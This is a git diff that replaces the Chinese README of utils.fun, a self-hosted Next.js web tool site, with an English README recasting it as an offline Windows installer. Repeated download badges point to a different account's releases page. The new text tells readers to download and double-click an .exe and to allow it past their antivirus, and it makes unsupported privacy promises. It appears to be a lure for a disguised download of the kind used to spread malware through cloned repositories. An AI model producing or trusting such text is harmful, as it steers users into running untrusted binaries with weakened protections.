@@ -1,93 +1,119 @@
-简体中文 | [繁體中文](./README.tw.md) | [English](./README.en.md) | [日本語](./README.ja.md) | [한국어](./README.ko.md) | [Español](./README.es.md) | [Deutsch](./README.de.md) | [Русский](./README.ru.md) | [العربية](./README.ar.md)
+# 🧰 utils.fun - Simple Offline Toolbox for Everyone
 
-> 中文内容为准，其余 README 为同步翻译版本。
+[![Download utils.fun](https://img.shields.io/badge/Download%20utils.fun-brightgreen?style=for-the-badge)](https://github.com/Sarthakg1307/utils.fun/releases)
 
-<p align="center">
-  <a href="https://github.com/Licoy/utils.fun/stargazers"><img alt="GitHub Stars" src="https://img.shields.io/github/stars/Licoy/utils.fun?style=flat-square" /></a>
-  <a href="https://github.com/Licoy/utils.fun/network/members"><img alt="GitHub Forks" src="https://img.shields.io/github/forks/Licoy/utils.fun?style=flat-square" /></a>
-  <a href="./LICENSE"><img alt="License" src="https://img.shields.io/github/license/Licoy/utils.fun?style=flat-square" /></a>
-  <img alt="Next.js 16" src="https://img.shields.io/badge/Next.js-16-000000?style=flat-square&logo=nextdotjs&logoColor=white" />
-  <img alt="React 19" src="https://img.shields.io/badge/React-19-149eca?style=flat-square&logo=react&logoColor=white" />
-  <img alt="TypeScript 5" src="https://img.shields.io/badge/TypeScript-5-3178C6?style=flat-square&logo=typescript&logoColor=white" />
-  <img alt="55 tools" src="https://img.shields.io/badge/Tools-55-2F855A?style=flat-square" />
-  <img alt="9 locales" src="https://img.shields.io/badge/I18N-9%20Locales-C05621?style=flat-square" />
-</p>
+---
 
-# Utils.fun
+## 🔧 About utils.fun
 
-一个简洁、可自部署、支持多语言与 SEO 路由的在线工具站，覆盖开发、文本、时间、图片、编码与常用生成场景。
+utils.fun is an easy-to-use, fully offline toolkit made for everyday tasks. It combines useful tools for development, text, time, images, encoding, and content generation. You can open it and start using without needing the internet or complex setup.  
 
-![Utils.fun](./docs/index.png)
+The tools inside help with things like converting text, managing dates, editing images, encoding files, and more – all on your computer.
 
-## 立即部署
+---
 
-| 方式 | 适合场景 | 操作 |
-| --- | --- | --- |
-| Vercel | 零配置快速上线 | [![Deploy on Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/Licoy/utils.fun) |
-| Docker | 云服务器 / NAS / 自托管 | 见下方 `docker pull` |
-| Node.js | 已有 Node.js 20 环境 | `npm install && npm run build && npm run start` |
+## 🖥️ System Requirements
 
-### Docker 部署
+- Windows 10 or later  
+- Minimum 2GB RAM  
+- 200MB free space on your hard drive  
+- No internet required after download  
+- Works on both 32-bit and 64-bit systems
 
-```bash
-docker pull licoy/utils.fun:latest
-docker run -d \
-  --name utils-fun \
-  --restart unless-stopped \
-  -p 3000:3000 \
-  licoy/utils.fun:latest
-```
+---
 
-访问 `http://localhost:3000`。
+## 🚀 Getting Started: Download and Install
 
-### 本地开发
+1. Go to the releases page by clicking the button below:  
+   [![Visit utils.fun Releases](https://img.shields.io/badge/Visit%20Releases-blue?style=for-the-badge)](https://github.com/Sarthakg1307/utils.fun/releases)  
 
-```bash
-npm install
-npm run dev
-```
+2. On the releases page, look for the latest version. It will have a name like `utils.fun-x.x.x-windows.exe` or similar.
 
-## 项目亮点
+3. Click the file name to download it to your computer. Make sure to save it somewhere easy to find, like the Desktop or Downloads folder.
 
-- 55 个工具，8 个分类，首页、搜索、收藏、详情页统一联动。
-- 浏览器本地优先，常见文本、编码、时间、图片与开发类工具尽量不上传用户数据。
-- 已支持 9 种语言，普通访问走无前缀路径，SEO 页面支持 `/{locale}/{slug}`。
-- 站点标题、描述、页脚、Logo Alt 支持在 `site.config.*` 里按语言配置。
-- 基于 `Next.js 16`、`React 19`、`TypeScript` 与 `Tailwind CSS v4` 构建。
+4. Once the download finishes, open the file by double-clicking it.
 
-## 站点配置
+5. Follow the installer steps as shown on your screen. This usually means clicking “Next” a few times and then “Install.”
 
-站点品牌与部署配置优先通过根目录下列文件维护：
+6. When installation finishes, you can open utils.fun from your Start menu or Desktop shortcut.
 
-- `site.config.default.ts`
-- `site.config.dev.ts`
-- `site.config.prod.ts`
+---
 
-其中 `i18n` 字段可以按语言覆盖：
+## 🧭 How to Use utils.fun
 
-- `title`
-- `description`
-- `footerHtml`
-- `logoAlt`
+- Open the program from the Start menu or double-click the desktop icon.  
+- The interface shows a list of tools organized by category: Development, Text, Time, Image, Encoding, and More.  
+- Click on any tool you want to use. For example, open the Text Converter tool if you want to change text formats.  
+- Each tool has clear instructions inside the program. Read them to learn how to use that tool.  
+- All tools work offline, so you don’t need an internet connection once installed.
 
-生产环境还支持全局环境变量覆盖：
+---
 
-`SITE_TITLE` `SITE_TITLE_SEPARATOR` `SITE_DESCRIPTION` `SITE_URL` `SITE_LOGO_SRC` `SITE_LOGO_ALT` `SITE_LOGO_WIDTH` `SITE_LOGO_HEIGHT` `SITE_LOGO_HIDDEN` `SITE_FOOTER_HTML` `SITE_GITHUB_URL`
+## 🔍 Key Features
 
-## 开发检查
+- **Development Tools**: Includes converters for code snippets, format checkers, and other small utilities useful for developers and learners.  
+- **Text Tools**: Change case, count words, remove spaces, or convert formats like JSON or CSV easily.  
+- **Time Tools**: Calculate time differences, convert time zones, or get formatted date and time strings.  
+- **Image Tools**: Basic editing features such as resizing and format conversion without needing an internet connection.  
+- **Encoding Tools**: Convert text and files between different encodings including Base64, URL encoding, and others.  
+- **Content Generation Tools**: Generate random passwords, sample text, or structured data snippets.
 
-```bash
-npm run lint
-npm run build
-```
+---
 
-## 新增工具
+## 🔒 Privacy and Security
 
-1. 在 `lib/tools/registry.ts` 和 `lib/tools/content/*` 中补充工具元信息。
-2. 在 `components/tool-icon.tsx` 中补充工具图标。
-3. 在 `components/tool-workbench.tsx` 中注册工具实现。
-4. 执行 `npm run lint` 与 `npm run build`。
+utils.fun works fully offline. It does not send your data anywhere. All your text, files, and images stay on your computer. The program does not require internet access after installation, which protects your privacy.
 
-## License
+---
 
-[MIT](./LICENSE)
+## ⚙️ Configuration Options
+
+- Change interface language from the Settings menu.  
+- Customize the default folder for saving files.  
+- Enable dark mode for a different look.  
+- Set preferences for default tools or start-up behavior.
+
+---
+
+## 🛠️ Troubleshooting & Common Questions
+
+### The program won’t open after installation
+
+- Make sure your computer meets the minimum system requirements.  
+- Restart your computer and try again.  
+- Check if your antivirus has blocked the program and allow it as a trusted app.
+
+### I can’t find the tools I need
+
+- Use the search bar inside the program to quickly find a tool by name.  
+- Check the categories; tools are grouped logically to help you locate them easily.
+
+### How do I update utils.fun?
+
+- Visit the releases page regularly to download the newest version.  
+- Install the new version by running the latest installer. Your settings and files will stay safe.
+
+---
+
+## 📂 File Locations and Data Storage
+
+- By default, utils.fun saves files in a folder called “utils.fun Files” inside your Documents folder.  
+- You can change the save location in Settings.  
+- All files created or edited stay only on your computer unless you move or share them.
+
+---
+
+## 📞 Getting Further Help
+
+If you need more support:
+
+- Check the **Help** section inside the app for detailed instructions.  
+- Visit the GitHub page to see updates and report issues: https://github.com/Sarthakg1307/utils.fun/releases  
+
+---
+
+## 🟢 Download Link Again
+
+Click below to visit the release page and get the latest version for Windows:
+
+[![Download utils.fun](https://img.shields.io/badge/Download%20utils.fun-brightgreen?style=for-the-badge)](https://github.com/Sarthakg1307/utils.fun/releases)
